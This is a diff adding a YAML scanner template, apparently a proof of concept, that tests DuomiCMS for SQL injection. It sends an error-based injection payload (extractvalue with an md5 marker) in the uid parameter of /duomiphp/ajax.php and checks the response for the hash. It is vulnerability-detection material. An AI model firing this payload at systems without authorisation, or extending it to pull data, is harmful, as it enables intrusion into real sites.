@@ -1,0 +1,20 @@
+name: yaml-poc-duomicms-duomicms-sql_injection-CT-158292
+binding: 6d150c17-0425-43d8-be91-b400df83aa33
+detail:
+    author: system_user
+    vulnerability:
+        id: b3c89911-25d7-431e-a934-92cc995eda4b
+        level: high
+transport: http
+set:
+    r1: randomInt(10000000, 50000000)
+    r2: md5(string(r1))
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /duomiphp/ajax.php?action=addfav&id=1&uid=1%20and%20extractvalue(1,concat_ws(1,1,md5({{r1}})))
+            follow_redirects: false
+        expression: response.body.bcontains(bytes(substr(r2, 1, 23)))
+expression: r0()
